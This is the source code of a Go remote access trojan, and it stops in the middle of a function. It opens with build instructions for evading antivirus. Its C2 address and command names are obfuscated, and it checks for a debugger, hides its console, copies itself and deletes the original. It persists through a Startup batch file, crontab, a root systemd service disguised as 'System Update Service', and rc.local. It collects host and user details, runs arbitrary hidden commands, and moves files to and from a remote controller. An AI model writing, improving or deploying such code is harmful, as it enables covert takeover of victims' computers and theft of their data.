// Build with obfuscation for AV evasion:
// 1. Install garble: go install mvdan.cc/garble@latest
// 2. Compile: garble -literals -seed=random -tiny build -ldflags="-s -w" -o rat.exe main.go
// 3. Pack: upx --brute rat.exe
// 4. Sign if possible: signtool sign /f cert.pfx rat.exe
// This reduces detection by renaming symbols, encrypting literals, stripping debug, and compressing.

package main

import (
	"archive/zip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"io/fs"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	hideFlag, bitmapFlag, copyFlag                             = 0, 2, 0x00CC0020
	noWindowFlag                                               = uint32(0x08000000)
	currentPass                                                = ""
	encryptedData                                              = make(map[string]string)
	encKey                                                     []byte
	obfAppNames                                                = []string{"366830433a207643511b7a0b692a2e45286c060b", "3168305f373f621e672172116a25035c115d5b0b5535664b", "32031e4e0a20660660316217503531493e5938536a230e4b", "3202244d0a0a5c1869207e55511f525c115d5b0b5535664b"}
	obfTest                                                    = "0377244e0a260d4f"
	obfDebug                                                   = "3d77245d0a30534f"
	obfUpload                                                  = "036830470c5576197a370959"
	obfDownload                                                = "3d774b070c0a48046a216503"
	obfKill                                                    = "06021e470c260d4f"
	obfSysinfo                                                 = "04031e4e0f30051f51010959"
	obfProcesses                                               = "04783842375566085044621e"
	obfServices                                                = "0402244d0a0a5c18692e7959"
	obfNetwork                                                 = "055d24040a55090b52010959"
	obfScreenshot                                              = "04023c4d3430660750445c1257335a0d"
	obfRegistry                                                = "045d245a0f3f7e4250185f59"
	obfStartup                                                 = "0403205c0d09624350370959"
	obfFirewall                                                = "3d5d1e4d343f541a51314359"
	obfAntivirus                                               = "3e6747040f3f6a025018621e"
	obfSetpass                                                 = "040224040d207608500f7559"
	obfGetpass                                                 = "3d0224040d20760850010959"
	obfEncrypt                                                 = "3d67475e0d095c0557357559"
	obfDecrypt                                                 = "3d77245e0d095c0557357559"
	obfListencrypted                                           = "05771e4e0a2066076a457e51503a355c2875535a"
	obfExtractbrowser                                          = "3d681a040d0a761857317e1d5141034a286c275a"
	obfExtractbrowserhidden                                    = "3d681a040d0a761857317e1d5141034a286c24085125611d6e33074f"
	obfBrowserpaths                                            = "3e5e38420a547e1e5018760c57350f4a"
	obfSetpersistence                                          = "040224040d207608500f7559"
	obfRemovepersistence                                       = "3d0224040d20760850010959"
	obfCheckpersistence                                        = "3e67475e0d095c0557357559"
	obfLs                                                      = "05783f09"
	obfDir                                                     = "3d771e4d"
	obfPwd                                                     = "0478165f"
	obfQ                                                       = "04614f09"
	obfCd                                                      = "3e022353"
	userLib, gdiLib, kernelLib                                 = shiftEncrypt("user32.dll"), shiftEncrypt("gdi32.dll"), shiftEncrypt("kernel32.dll")
	getWindowProc, showWindowProc, getMetricsProc, getDCProc   = shiftEncrypt("GetConsoleWindow"), shiftEncrypt("ShowWindow"), shiftEncrypt("GetSystemMetrics"), shiftEncrypt("GetDC")
	createDCProc, createBitmapProc, selectObjProc, bitCopyProc = shiftEncrypt("CreateCompatibleDC"), shiftEncrypt("CreateCompatibleBitmap"), shiftEncrypt("SelectObject"), shiftEncrypt("BitBlt")
	deleteObjProc, deleteDCProc, releaseDCProc, openClipProc   = shiftEncrypt("DeleteObject"), shiftEncrypt("DeleteDC"), shiftEncrypt("ReleaseDC"), shiftEncrypt("OpenClipboard")
	emptyClipProc, setClipProc, closeClipProc, debugCheckProc  = shiftEncrypt("EmptyClipboard"), shiftEncrypt("SetClipboardData"), shiftEncrypt("CloseClipboard"), shiftEncrypt("IsDebuggerPresent")
	instanceLock                                               sync.Mutex
	lockFile                                                   = ""
	obfC2Host                                                  = "05671e47373f66425235051056250346165902127c1c7d1a570a691e3d5e2043220a7e0451270959"
	obfPortStr                                                 = "2974234e"
	// When true (build tag localtest + lastfinalversion2_localtest.go), C2 defaults to 127.0.0.1:443; C2_HOST / C2_PORT still override.
	c2LocalTestMode bool
)

// Fixed shift for consistency (must match shiftEncrypt for user32/kernel32 API blobs).
const shiftValue = 5

// XOR key for enhanced obfuscation (must match every obf* hex literal; rotate only with full regen).
const xorKey = "g0r4ng0r3v4d3r"

func shiftEncrypt(text string) string {
	result := make([]byte, len(text))
	for i, char := range text {
		result[i] = byte((int(char) + shiftValue) % 256)
	}
	return string(result)
}

func shiftDecrypt(text string) string {
	result := make([]byte, len(text))
	for i, char := range text {
		result[i] = byte((int(char) - shiftValue + 256) % 256)
	}
	return string(result)
}

// Enhanced string obfuscation: Base64 + XOR + Hex
func xorEncode(data []byte, key string) []byte {
	k := []byte(key)
	for i := range data {
		data[i] ^= k[i%len(k)]
	}
	return data
}

func obfuscateString(input string) string {
	b64 := base64.StdEncoding.EncodeToString([]byte(input))
	xored := xorEncode([]byte(b64), xorKey)
	return hex.EncodeToString(xored)
}

func deobfuscateString(hexStr string) string {
	xoredBytes, _ := hex.DecodeString(hexStr)
	b64Bytes := xorEncode(xoredBytes, xorKey) // XOR again to undo
	b64Str := string(b64Bytes)
	decoded, _ := base64.StdEncoding.DecodeString(b64Str)
	return string(decoded)
}

// API string hashing (djb2) for dynamic resolution evasion
func hashString(s string) uint32 {
	hash := uint32(5381)
	for _, c := range s {
		hash = ((hash << 5) + hash) + uint32(c)
	}
	return hash
}

// Junk computation noise (no large heap alloc — avoids OOM on low-RAM hosts)
func addJunkData() {
	sum := 0
	for i := 0; i < 20000; i++ {
		sum += i * (i % 7)
		_ = sum % 42
	}
	_ = sum
	for j := 0; j < 5000; j++ {
		_ = j * j * j % 123
	}
}

// Junk heavy computation
func junkHeavy() {
	sum := int64(0)
	for i := int64(0); i < 10000000; i++ {
		sum += i * i
	}
	_ = sum
	runtime.GC()
	for k := 0; k < 100; k++ {
		_ = hashString(strconv.Itoa(k))
	}
}

// Basic debug check (VM/sandbox detection removed)
func checkDebug() bool {
	// Only check for debugger presence on Windows
	if runtime.GOOS == "windows" {
		kernelLibLoad := syscall.NewLazyDLL(shiftDecrypt(kernelLib))
		debugProc := kernelLibLoad.NewProc(shiftDecrypt(debugCheckProc))
		ret, _, _ := debugProc.Call()
		if ret != 0 {
			return true
		}
	}
	return false
}

func createLock() bool {
	return createLockWithPrefix("app")
}

func createAppLock() bool {
	return createLock()
}

func lockFileName(prefix string) string {
	host := strings.Map(func(r rune) rune {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') || (r >= '0' && r <= '9') || r == '-' || r == '_' {
			return r
		}
		return '_'
	}, getHostname())
	return fmt.Sprintf("%s_%s.lock", prefix, host)
}

func createLockWithPrefix(prefix string) bool {
	instanceLock.Lock()
	defer instanceLock.Unlock()

	lockName := lockFileName(prefix)
	var lockPath string
	if runtime.GOOS == "windows" {
		lockPath = filepath.Join(os.TempDir(), lockName)
	} else {
		lockPath = filepath.Join("/tmp", lockName)
	}

	file, err := os.OpenFile(lockPath, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0644)
	if err != nil {
		return false
	}

	fmt.Fprintf(file, "%d\n%s\n", os.Getpid(), time.Now().Format(time.RFC3339))
	file.Close()

	if prefix == "app" {
		lockFile = lockPath
	}

	go func() {
		defer func() {
			if lockPath != "" {
				os.Remove(lockPath)
			}
		}()

		for {
			time.Sleep(30 * time.Second)
			if _, err := os.Stat(lockPath); os.IsNotExist(err) {
				break
			}

			if runtime.GOOS == "windows" {
				cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("PID eq %d", os.Getpid()), "/FO", "CSV", "/NH")
				cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
				output, err := cmd.Output()
				if err != nil || len(output) == 0 || strings.Contains(string(output), "INFO: No tasks") {
					os.Remove(lockPath)
					break
				}
			} else {
				cmd := exec.Command("ps", "-p", fmt.Sprintf("%d", os.Getpid()))
				output, err := cmd.Output()
				if err != nil || len(output) == 0 {
					os.Remove(lockPath)
					break
				}
			}

			file, err := os.OpenFile(lockPath, os.O_WRONLY|os.O_TRUNC, 0644)
			if err == nil {
				fmt.Fprintf(file, "%d\n%s\n", os.Getpid(), time.Now().Format(time.RFC3339))
				file.Close()
			}
		}
	}()

	// Add junk code
	_ = time.Now().UnixNano() % 100
	_ = hashString("lock_junk")
	return true
}

func isRunning() bool {
	return isRunningWithPrefix("app")
}

func isAppRunning() bool {
	return isRunningWithPrefix("app")
}

func isRunningWithPrefix(prefix string) bool {
	var searchDir string
	if runtime.GOOS == "windows" {
		searchDir = os.TempDir()
	} else {
		searchDir = "/tmp"
	}

	files, err := filepath.Glob(filepath.Join(searchDir, lockFileName(prefix)))
	if err != nil || len(files) == 0 {
		return false
	}

	for _, file := range files {
		if file == lockFile {
			continue
		}

		content, err := os.ReadFile(file)
		if err != nil {
			continue
		}

		lines := strings.Split(strings.TrimSpace(string(content)), "\n")
		if len(lines) < 2 {
			continue
		}

		pidStr := strings.TrimSpace(lines[0])
		pid, err := strconv.Atoi(pidStr)
		if err != nil {
			continue
		}

		if runtime.GOOS == "windows" {
			cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("PID eq %d", pid), "/FO", "CSV", "/NH")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
			output, err := cmd.Output()
			if err == nil && len(output) > 0 && !strings.Contains(string(output), "INFO: No tasks") {
				return true
			}
		} else {
			cmd := exec.Command("ps", "-p", pidStr)
			output, err := cmd.Output()
			if err == nil && len(output) > 0 {
				return true
			}
		}

		os.Remove(file)
	}

	return false
}

// One process per machine — must run before makeCopy / network loop.
func ensureSingleInstance() bool {
	if isAppRunning() {
		return false
	}
	if createAppLock() {
		return true
	}
	time.Sleep(800 * time.Millisecond)
	if isAppRunning() {
		return false
	}
	return createAppLock()
}

func normalizeExePath(path string) string {
	path = strings.TrimSpace(path)
	if path == "" {
		return ""
	}
	abs, err := filepath.Abs(path)
	if err != nil {
		return filepath.Clean(path)
	}
	return abs
}

func isPersistedCopyPath(path string) bool {
	abs := normalizeExePath(path)
	if abs == "" {
		return false
	}
	name := filepath.Base(abs)
	for _, dir := range getPlacementLocations() {
		if strings.EqualFold(filepath.Join(dir, name), abs) {
			return true
		}
	}
	return false
}

// Registry Run + Startup folder both launch at logon — keep only startup (v3backup uses the same).
func removeRegistryAutoStart() {
	if runtime.GOOS != "windows" {
		return
	}
	_ = runHiddenCmd("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", persistRunValue, "/f").Run()
}

type SysInfo struct {
	Host, Mac, User, Session string
}

type Cmd struct {
	Type, Content string
}

type Resp struct {
	Type, Content string
}

func hiddenProcAttr() *syscall.SysProcAttr {
	return &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
}

func runHiddenCmd(name string, args ...string) *exec.Cmd {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = hiddenProcAttr()
	return cmd
}

// User-writable paths first; system dirs as fallback (matches v3backup.go)
func getPlacementLocations() []string {
	var locations []string

	if home, err := os.UserHomeDir(); err == nil && home != "" {
		locations = append(locations,
			filepath.Join(home, "AppData", "Local"),
			filepath.Join(home, "Documents"),
			filepath.Join(home, "Downloads"),
			home,
		)
	}
	if localAppData := os.Getenv("LOCALAPPDATA"); localAppData != "" {
		locations = append(locations, localAppData)
	}
	if appData := os.Getenv("APPDATA"); appData != "" {
		locations = append(locations, appData)
	}

	locations = append(locations,
		`C:\Temp`,
		`C:\Users\Public`,
		`C:\Windows\Temp`,
		`C:\ProgramData`,
	)

	return locations
}

func getUserStartupDir() (string, error) {
	if appData := os.Getenv("APPDATA"); appData != "" {
		dir := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if _, err := os.Stat(dir); err == nil {
			return dir, nil
		}
	}
	if home, err := os.UserHomeDir(); err == nil && home != "" {
		dir := filepath.Join(home, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
		if _, err := os.Stat(dir); err == nil {
			return dir, nil
		}
	}
	return "", fmt.Errorf("user startup folder not found")
}

func copyExecutableFile(src, dst string) error {
	data, err := os.ReadFile(src)
	if err != nil {
		return err
	}
	if err := os.MkdirAll(filepath.Dir(dst), 0755); err != nil {
		return err
	}
	return os.WriteFile(dst, data, 0755)
}

func hideTerminal() {
	if runtime.GOOS != "windows" {
		return
	}

	kernelLibLoad := syscall.NewLazyDLL(shiftDecrypt(kernelLib))
	userLibLoad := syscall.NewLazyDLL(shiftDecrypt(userLib))

	proc := kernelLibLoad.NewProc(shiftDecrypt(getWindowProc))
	hwnd, _, _ := proc.Call()

	if hwnd != 0 {
		showProc := userLibLoad.NewProc(shiftDecrypt(showWindowProc))
		showProc.Call(hwnd, uintptr(hideFlag))
	}

	proc = kernelLibLoad.NewProc("FreeConsole")
	proc.Call()

	proc = kernelLibLoad.NewProc("SetPriorityClass")
	proc.Call(uintptr(os.Getpid()), 0x00004000)
	// Add junk code
	_ = time.Now().UnixNano() % 100
	_ = hashString("hide_junk")
}

func makeCopy() string {
	exePath, err := os.Executable()
	if err != nil {
		return ""
	}
	exePath = normalizeExePath(exePath)

	// Already running from v3backup / prior drop — do not copy again.
	if isPersistedCopyPath(exePath) {
		return exePath
	}

	if runtime.GOOS != "windows" {
		copyPath := filepath.Join("/tmp", makeRandomName())
		if copyExecutableFile(exePath, copyPath) == nil {
			_ = os.Remove(exePath)
			return copyPath
		}
		return exePath
	}

	dropName := filepath.Base(exePath)
	for _, dir := range getPlacementLocations() {
		if _, err := os.Stat(dir); err != nil {
			continue
		}
		copyPath := filepath.Join(dir, dropName)
		if _, err := os.Stat(copyPath); err == nil {
			continue
		}
		if copyErr := copyExecutableFile(exePath, copyPath); copyErr == nil {
			_ = os.Remove(exePath)
			return copyPath
		}
	}

	// Legacy app-mode names under the same simple dirs (not System32)
	appNames := getAppNames()
	for _, dir := range getPlacementLocations() {
		if _, err := os.Stat(dir); err != nil {
			continue
		}
		for _, name := range appNames {
			copyPath := filepath.Join(dir, name)
			if _, err := os.Stat(copyPath); err == nil {
				continue
			}
			if copyErr := copyExecutableFile(exePath, copyPath); copyErr == nil {
				_ = os.Remove(exePath)
				return copyPath
			}
		}
	}

	return exePath
}

func getAppNames() []string {
	var names []string
	for _, obfName := range obfAppNames {
		names = append(names, deobfuscateString(obfName))
	}
	return names
}

const persistRunValue = "ScService"

func startupLauncherPath(exePath string) (string, error) {
	startupDir, err := getUserStartupDir()
	if err != nil {
		return "", err
	}
	name := strings.TrimSuffix(filepath.Base(exePath), filepath.Ext(exePath)) + ".bat"
	return filepath.Join(startupDir, name), nil
}

func isPersistenceSet(exePath string) bool {
	if runtime.GOOS == "windows" {
		if launcher, err := startupLauncherPath(exePath); err == nil {
			if _, err := os.Stat(launcher); err == nil {
				return true
			}
		}
	} else {
		// Check crontab
		cmd := exec.Command("crontab", "-l")
		output, err := cmd.Output()
		if err == nil && strings.Contains(string(output), exePath) {
			return true
		}
	}
	return false
}

func setUserStartupPersistence(exePath string) error {
	startupDir, err := getUserStartupDir()
	if err != nil {
		return err
	}
	launcherName := strings.TrimSuffix(filepath.Base(exePath), filepath.Ext(exePath)) + ".bat"
	launcherPath := filepath.Join(startupDir, launcherName)
	content := fmt.Sprintf(`@echo off
start "" "%s"`, exePath)
	return os.WriteFile(launcherPath, []byte(content), 0644)
}

func setPersistence(exePath string) {
	exePath = normalizeExePath(exePath)
	if exePath == "" || isPersistenceSet(exePath) {
		return
	}

	if runtime.GOOS == "windows" {
		// Single autostart channel: Startup folder only (not HKCU Run — that doubles with .bat).
		removeRegistryAutoStart()
		_ = setUserStartupPersistence(exePath)

		for i := 0; i < 5; i++ {
			_ = i * i
		}
		_ = hashString("persist_junk")
	} else {
		// Linux persistence methods
		// Method 1: Crontab
		cronEntry := fmt.Sprintf("@reboot %s\n", exePath)
		cmd := exec.Command("crontab", "-l")
		currentCron, _ := cmd.Output()
		if !strings.Contains(string(currentCron), exePath) {
			newCron := string(currentCron) + cronEntry
			cmd = exec.Command("crontab", "-")
			cmd.Stdin = strings.NewReader(newCron)
			_ = cmd.Run()
		}

		// Method 2: Systemd service
		serviceName := "system-update.service"
		serviceContent := fmt.Sprintf(`[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target`, exePath)

		servicePath := fmt.Sprintf("/etc/systemd/system/%s", serviceName)
		os.WriteFile(servicePath, []byte(serviceContent), 0644)

		// Enable and start service
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", serviceName).Run()
		exec.Command("systemctl", "start", serviceName).Run()

		// Method 3: /etc/rc.local
		rcLocalPath := "/etc/rc.local"
		rcLocalContent := fmt.Sprintf("#!/bin/bash\n%s &\n", exePath)
		os.WriteFile(rcLocalPath, []byte(rcLocalContent), 0755)
	}
	// Add junk code
	_ = time.Now().UnixNano() % 100
}

func v3SystemCopyDirs() []string {
	return getPlacementLocations()
}

// v3PersistedCopyFileName: prefer original exe name; legacy winupdate* hash for older drops.
func v3PersistedCopyFileName(absExe string) string {
	base := filepath.Base(absExe)
	if strings.EqualFold(filepath.Ext(base), ".exe") {
		return base
	}
	h := sha256.Sum256([]byte(absExe))
	return "winupdate" + hex.EncodeToString(h[:3]) + ".exe"
}

func isV3PersistedCopyBasename(base string) bool {
	s := strings.ToLower(base)
	const pfx, sfx = "winupdate", ".exe"
	if !strings.HasPrefix(s, pfx) || !strings.HasSuffix(s, sfx) {
		return false
	}
	mid := s[len(pfx) : len(s)-len(sfx)]
	if len(mid) != 6 {
		return false
	}
	for i := 0; i < 6; i++ {
		c := mid[i]
		if (c < '0' || c > '9') && (c < 'a' || c > 'f') {
			return false
		}
	}
	return true
}

// persistedExePathForScRunKey is the path V3 dropped (e.g. C:\Windows\Temp\winupdateea81d7.exe): use when already
// running that copy, else find the copy V3 created for this binary using the same name + dirs as V3.go.
func persistedExePathForScRunKey() string {
	exe, err := os.Executable()
	if err != nil {
		return ""
	}
	exe, _ = filepath.Abs(exe)
	base := filepath.Base(exe)
	if isV3PersistedCopyBasename(base) {
		return exe
	}
	names := []string{v3PersistedCopyFileName(exe)}
	h := sha256.Sum256([]byte(exe))
	legacy := "winupdate" + hex.EncodeToString(h[:3]) + ".exe"
	if legacy != names[0] {
		names = append(names, legacy)
	}
	for _, dir := range v3SystemCopyDirs() {
		for _, name := range names {
			candidate := filepath.Join(dir, name)
			if st, err := os.Stat(candidate); err == nil && !st.IsDir() {
				return candidate
			}
		}
	}
	return exe
}

func removePersistence() {
	if runtime.GOOS == "windows" {
		removeRegistryAutoStart()
		_ = runHiddenCmd("schtasks", "/delete", "/tn", "WindowsUpdateService", "/f").Run()
		_ = runHiddenCmd("reg", "delete", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", "WindowsUpdateService", "/f").Run()

		if exe, err := os.Executable(); err == nil {
			if launcher, err := startupLauncherPath(exe); err == nil {
				_ = os.Remove(launcher)
			}
		}
		if startupDir, err := getUserStartupDir(); err == nil {
			_ = os.Remove(filepath.Join(startupDir, "WindowsUpdateService.bat"))
		}

		_ = runHiddenCmd("sc", "stop", "WindowsUpdateService").Run()
		_ = runHiddenCmd("sc", "delete", "WindowsUpdateService").Run()
	} else {
		// Remove from crontab
		cmd := exec.Command("crontab", "-l")
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			var newLines []string
			for _, line := range lines {
				if !strings.Contains(line, "WindowsUpdateService") && !strings.Contains(line, "system-update") {
					newLines = append(newLines, line)
				}
			}
			if len(newLines) != len(lines) {
				newCron := strings.Join(newLines, "\n")
				cmd = exec.Command("crontab", "-")
				cmd.Stdin = strings.NewReader(newCron)
				_ = cmd.Run()
			}
		}

		// Remove systemd service
		exec.Command("systemctl", "stop", "system-update.service").Run()
		exec.Command("systemctl", "disable", "system-update.service").Run()
		os.Remove("/etc/systemd/system/system-update.service")
		exec.Command("systemctl", "daemon-reload").Run()
	}
}

func isAppMode() bool {
	exePath, _ := os.Executable()

	appNames := getAppNames()
	for _, name := range appNames {
		if strings.Contains(exePath, name) {
			return true
		}
	}

	prefixes := []string{"App", "System", "Update", "Service", "Process", "Manager", "Handler", "Controller", "Monitor", "Agent"}
	suffixes := []string{"Starter", "Processor", "Manager", "Service", "Handler", "Controller", "Monitor", "Agent", "Helper", "Worker"}

	for _, prefix := range prefixes {
		for _, suffix := range suffixes {
			expectedName := prefix + suffix + ".exe"
			if strings.Contains(exePath, expectedName) {
				return true
			}
		}
	}

	return false
}

func setupSignals() {
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		for {
			select {
			case <-c:
				if lockFile != "" {
					os.Remove(lockFile)
				}
				os.Exit(0)
			}
		}
	}()
}

func initAppMode() {
	if checkDebug() {
		os.Exit(0)
	}
}

func sendData(conn net.Conn, data interface{}) error {
	jsonData, err := json.Marshal(data)
	if err != nil {
		return err
	}
	_, err = conn.Write(append(jsonData, '\n'))
	return err
}

func recvData(conn net.Conn) (string, error) {
	var buffer strings.Builder
	tempBuffer := make([]byte, 4096)
	conn.SetReadDeadline(time.Time{})
	for {
		n, err := conn.Read(tempBuffer)
		if err != nil {
			if err == io.EOF {
				break
			}
			return "", err
		}
		buffer.Write(tempBuffer[:n])
		data := buffer.String()
		var testCmd Cmd
		if json.Unmarshal([]byte(data), &testCmd) == nil {
			return data, nil
		}
		if strings.Contains(data, "\n") {
			lines := strings.Split(data, "\n")
			if len(lines) > 0 {
				return lines[0], nil
			}
		}
		if buffer.Len() > 1024*1024 {
			break
		}
	}
	return buffer.String(), nil
}

// Client-side download progress (STDERR). Does not touch the TCP binary stream.
var (
	downloadProgressMu   sync.Mutex
	downloadProgressLast time.Time
)

func downloadProgressAllowPrint(force bool) bool {
	downloadProgressMu.Lock()
	defer downloadProgressMu.Unlock()
	now := time.Now()
	if !force && now.Sub(downloadProgressLast) < 200*time.Millisecond {
		return false
	}
	downloadProgressLast = now
	return true
}

func downloadPrintProgress(sent, total int64, label string) {
	if total <= 0 {
		return
	}
	if !downloadProgressAllowPrint(sent >= total) && sent < total {
		return
	}
	const barW = 36
	pct := int(sent * 100 / total)
	if pct > 100 {
		pct = 100
	}
	filled := int(sent * int64(barW) / total)
	if filled > barW {
		filled = barW
	}
	lab := label
	if len(lab) > 30 {
		lab = lab[:27] + "..."
	}
	bar := strings.Repeat("=", filled) + strings.Repeat(" ", barW-filled)
	fmt.Fprintf(os.Stderr, "\r[download] %-32s [%s] %3d%%", lab, bar, pct)
}

func downloadProgressDoneLine() {
	fmt.Fprintln(os.Stderr, "")
}

func downloadFile(conn net.Conn, rawPath string) error {
	path := strings.TrimSpace(rawPath)
	if path == "" {
		return fmt.Errorf("empty path")
	}
	path = filepath.Clean(path)
	fi, err := os.Stat(path)
	if err != nil {
		return err
	}
	if fi.IsDir() {
		return downloadDirectoryAsZip(conn, path)
	}
	return downloadRegularFile(conn, path, fi.Size())
}

func downloadRegularFile(conn net.Conn, path string, size int64) error {
	f, err := os.Open(path)
	if err != nil {
		return err
	}
	defer f.Close()
	name := filepath.Base(path)
	var written int64
	buf := make([]byte, 256*1024)
	for {
		n, rerr := f.Read(buf)
		if n > 0 {
			_, werr := conn.Write(buf[:n])
			if werr != nil {
				return werr
			}
			written += int64(n)
			if size > 0 {
				downloadPrintProgress(written, size, name)
			}
		}
		if rerr == io.EOF {
			break
		}
		if rerr != nil {
			return rerr
		}
	}
	if size > 0 {
		downloadPrintProgress(written, size, name)
	}
	downloadProgressDoneLine()
	return nil
}

func downloadDirectoryAsZip(conn net.Conn, dir string) error {
	type zipItem struct {
		rel  string
		full string
		size int64
	}
	dirAbs, err := filepath.Abs(dir)
	if err != nil {
		dirAbs = dir
	}
	var items []zipItem
	var total int64
	err = filepath.WalkDir(dirAbs, func(p string, d fs.DirEntry, walkErr error) error {
		if walkErr != nil {
			return walkErr
		}
		if d.IsDir() {
			return nil
		}
		info, e := d.Info()
		if e != nil {
			return nil
		}
		if !info.Mode().IsRegular() {
			return nil
		}
		rel, e := filepath.Rel(dirAbs, p)
		if e != nil || strings.HasPrefix(rel, "..") {
			return nil
		}
		sz := info.Size()
		items = append(items, zipItem{rel: rel, full: p, size: sz})
		total += sz
		return nil
	})
	if err != nil {
		return err
	}
	zw := zip.NewWriter(conn)
	defer zw.Close()
	rootName := filepath.Base(dirAbs)
	label := rootName + ".zip (folder)"
	var sent int64
	buf := make([]byte, 256*1024)
	for _, it := range items {
		hdr := &zip.FileHeader{
			Name:   filepath.ToSlash(filepath.Join(rootName, it.rel)),
			Method: zip.Deflate,
		}
		if st, err := os.Stat(it.full); err == nil {
			hdr.Modified = st.ModTime()
		}
		w, err := zw.CreateHeader(hdr)
		if err != nil {
			return err
		}
		rf, err := os.Open(it.full)
		if err != nil {
			continue
		}
		for {
			n, rerr := rf.Read(buf)
			if n > 0 {
				_, werr := w.Write(buf[:n])
				if werr != nil {
					rf.Close()
					return werr
				}
				sent += int64(n)
				if total > 0 {
					downloadPrintProgress(sent, total, label)
				}
			}
			if rerr == io.EOF {
				break
			}
			if rerr != nil {
				rf.Close()
				return rerr
			}
		}
		rf.Close()
	}
	if total > 0 {
		downloadPrintProgress(sent, total, label)
	}
	downloadProgressDoneLine()
	return nil
}

func uploadFile(conn net.Conn, filename string) error {
	file, err := os.Create(filename)
	if err != nil {
		return err
	}
	defer file.Close()
	conn.SetReadDeadline(time.Time{})
	sizeBytes := make([]byte, 8)
	_, err = io.ReadFull(conn, sizeBytes)
	if err != nil {
		return fmt.Errorf("failed to read file size: %v", err)
	}
	fileSize := int64(binary.LittleEndian.Uint64(sizeBytes))
	copyBuf := make([]byte, 256*1024)
	_, err = io.CopyBuffer(file, io.LimitReader(conn, fileSize), copyBuf)
	if err != nil {
		return fmt.Errorf("failed to read file data: %v", err)
	}
	return nil
}

func getHostname() string {
	hostname, err := os.Hostname()
	if err != nil {
		return "unknown"
	}
	return hostname
}

func getMACAddress() string {
	if runtime.GOOS == "windows" {
		cmd := exec.Command("getmac", "/fo", "csv", "/nh")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
		output, err := cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(line, ",") {
					parts := strings.Split(line, ",")
					if len(parts) >= 2 {
						mac := strings.Trim(parts[1], "\"")
						if len(mac) == 17 && strings.Count(mac, "-") == 5 {
							return mac
						}
					}
				}
			}
		}
		cmd = exec.Command("ipconfig", "/all")
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
		output, err = cmd.Output()
		if err == nil {
			lines := strings.Split(string(output), "\n")
			for _, line := range lines {
				if strings.Contains(strings.ToLower(line), "physical address") {
					parts := strings.Split(line, ":")
					if len(parts) >= 2 {
						mac := strings.TrimSpace(parts[1])
						if len(mac) == 17 && strings.Count(mac, "-") == 5 {
							return mac
						}
					}
				}
			}
		}
	} else {
		cmd := exec.Command("sh", "-c", "ip link show | grep -o -E '([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})' | head -1")
		output, err := cmd.Output()
		if err == nil {
			mac := strings.TrimSpace(string(output))
			if len(mac) == 17 && strings.Count(mac, ":") == 5 {
				return mac
			}
		}
		cmd = exec.Command("sh", "-c", "ifconfig | grep -o -E '([0-9A-Fa-f]{2}:){5}([0-9A-Fa-f]{2})' | head -1")
		output, err = cmd.Output()
		if err == nil {
			mac := strings.TrimSpace(string(output))
			if len(mac) == 17 && strings.Count(mac, ":") == 5 {
				return mac
			}
		}
	}
	return "00:00:00:00:00:00"
}

func getUsername() string {
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = os.Getenv("LOGNAME")
	}
	if username == "" {
		if runtime.GOOS == "windows" {
			cmd := exec.Command("cmd", "/c", "echo %USERNAME%")
			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
			output, err := cmd.Output()
			if err == nil {
				username = strings.TrimSpace(string(output))
			}
		} else {
			cmd := exec.Command("whoami")
			output, err := cmd.Output()
			if err == nil {
				username = strings.TrimSpace(string(output))
			}
		}
	}
	if username == "" {
		username = "unknown"
	}
	return username
}

func makeSessionID() string {
	return fmt.Sprintf("%d_%d_%s", os.Getpid(), time.Now().UnixNano(), getHostname())
}

func makeRandomName() string {
	var b [8]byte
	_, _ = rand.Read(b[:])
	return fmt.Sprintf("%x.exe", b)
}

func runCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: noWindowFlag}
	} else {
		cmd = exec.Command("nohup", "sh", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		outputStr := string(output)
		outputLower := strings.ToLower(outputStr)
		if strings.Contains(outputLower, "not recognized") ||
			strings.Contains(outputLower, "invalid argument") ||
			strings.Contains(outputLower, "not found") ||
			strings.Contains(outputLower, "bad command") ||
			strings.Contains(outputLower, "invalid option") ||
			strings.Contains(outputLower, "usage:") ||
			strings.Contains(outputLower, "type") && strings.Contains(outputLower, "for usage") {
			return "Invalid command or argument"
		}
		return fmt.Sprintf("Command failed: %s", strings.TrimSpace(outputStr))
	}
	return string(output)
}

func runCommandWithChunks(command string, conn net.Conn) {
	result := runCommand(command)

	if len(result) <= 1048576 {
		response := Resp{Type: "response", Content: result}
